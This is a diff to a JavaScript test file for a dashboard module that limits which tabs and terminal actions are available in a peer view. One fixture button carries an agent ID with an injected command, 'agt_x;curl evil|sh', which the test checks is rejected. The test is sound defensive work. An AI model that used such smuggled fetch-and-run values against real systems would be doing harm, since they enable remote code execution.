@@ -11,6 +11,7 @@ test('feature and tab states follow the peer_view metadata', async (t) => {
   assert.equal(mod.tabState('costs', pv), 'omitted');
   assert.equal(mod.tabState('config', pv), 'local');
   assert.equal(mod.tabState('map', pv), 'shared', 'the map is this operator\'s own fleet view');
+  assert.equal(mod.tabState('terminals', pv), 'shared', 'a peer\'s agent opens in this browser\'s Terminals tab');
   assert.equal(mod.tabState('groups', null), 'shared', 'before the first answer the snapshot view is assumed');
   assert.equal(mod.tabState('costs', null), 'omitted');
   assert.equal(mod.limitHint('omitted', 'costs', 'forge'), 'forge does not share costs with you');
@@ -79,13 +80,14 @@ test('palette commands and tab routing respect what the peer offers', async (t) 
   assert.equal(mod.peerViewTabUsable('config', { remote, peerView: null }), false, 'no peer route at all');
   assert.equal(mod.peerViewTabUsable('costs', { remote, peerView: null }), true, 'a deep link waits for the peer to answer');
   assert.equal(mod.peerViewTabUsable('config', { remote: undefined }), true);
+  assert.equal(mod.peerViewTabUsable('terminals', { remote, peerView: pv }), true);
 });
 
 test('a peer agent\'s terminal action opens it in the browser terminal', async (t) => {
   const harness = await createPreactHarness(t);
   const mod = await harness.importDashboardModule('js/peer-view-limits.js');
   const doc = harness.document;
-  doc.body.innerHTML = '<button id="win" data-act="web-open-window" data-agent="agt_abc123">web window</button><button id="gt" data-act="group-web-term">group term</button><button id="evil" data-act="jump" data-agent="agt_x;curl evil|sh">evil</button>';
+  doc.body.innerHTML = '<button id="win" data-act="web-open-window" data-agent="agt_abc123">web window</button><button id="gt" data-act="group-web-term">group term</button><button id="evil" data-act="jump" data-agent="agt_x;curl evil|sh">evil</button><nav><a id="tt" data-tab="terminals" href="/terminals">Terminals</a><a id="ct" data-tab="config" href="/config">Config</a></nav>';
   doc.documentElement.dataset.remoteNodeName = 'forge';
   const opened = []; const toasts = [];
   const dispose = mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal({ peer_view: pv }), toast: (m, err) => toasts.push([m, err]), remote: { id: 'inst_forge7' }, openTerminal: async (o) => { opened.push(o); } });
@@ -97,5 +99,7 @@ test('a peer agent\'s terminal action opens it in the browser terminal', async (
   harness.fireEvent(doc.getElementById('evil'), 'click');
   assert.equal(opened.length, 1, 'an agent ID that is not a plain agt_ ID is never opened');
   assert.equal(toasts.at(-1)[0], 'This action is not available in a peer view');
+  assert.equal(harness.fireEvent(doc.getElementById('ct'), 'click').defaultPrevented, true, 'a tab with no peer route stays blocked');
+  assert.equal(harness.fireEvent(doc.getElementById('tt'), 'click').defaultPrevented, false, 'the Terminals tab, where the peer\'s agent opened, can be shown');
   dispose();
 });
